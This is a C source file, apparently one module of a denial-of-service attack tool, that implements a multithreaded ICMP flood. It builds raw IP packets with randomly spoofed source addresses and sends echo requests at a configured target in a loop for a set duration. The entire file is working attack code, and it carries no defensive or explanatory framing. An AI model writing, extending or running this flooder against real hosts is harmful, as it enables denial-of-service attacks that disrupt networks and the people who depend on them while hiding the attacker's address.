#include "../../include/elcienco.h"
#include "../../include/protocols.h"

extern volatile int attack_running;

void *icmp_flood(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    // Create raw socket for ICMP
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket creation failed");
        free(data);
        return NULL;
    }
    
    // Set IP_HDRINCL to build our own IP header
    int opt = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        perror("Failed to set IP_HDRINCL for ICMP");
        close(sock);
        free(data);
        return NULL;
    }
    
    char packet[sizeof(struct ip_header) + sizeof(struct icmp_header)];
    struct sockaddr_in target_addr;
    
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(cfg.target);
    
    time_t start_time = time(NULL);
    unsigned long packets_sent = 0;
    
    printf("[ICMP Flood Thread %d] Started against %s\n",
           data->thread_num, cfg.target);
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        char src_ip[16];
        random_ip(src_ip);
        
        // Pointers to packet sections
        struct ip_header *iph = (struct ip_header *)packet;
        struct icmp_header *icmph = (struct icmp_header *)(packet + sizeof(struct ip_header));
        
        // Build IP header
        build_ip_header(iph, src_ip, cfg.target, PROTO_ICMP, sizeof(struct icmp_header));
        
        // Build ICMP header
        icmph->type = 8; // Echo Request
        icmph->code = 0;
        icmph->id = htons(rand() % 65535);
        icmph->sequence = htons(packets_sent % 65535);
        icmph->check = 0;
        icmph->check = checksum((unsigned short *)icmph, sizeof(struct icmp_header));
        
        // Send packet
        sendto(sock, packet, sizeof(packet), 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        packets_sent++;
        
        // Small delay to prevent overwhelming local system
        if (packets_sent % 100 == 0) {
            usleep(1000);
        }
    }
    
    printf("[ICMP Flood Thread %d] Finished. Packets sent: %lu\n",
           data->thread_num, packets_sent);
    
    close(sock);
    free(data);
    return NULL;
}
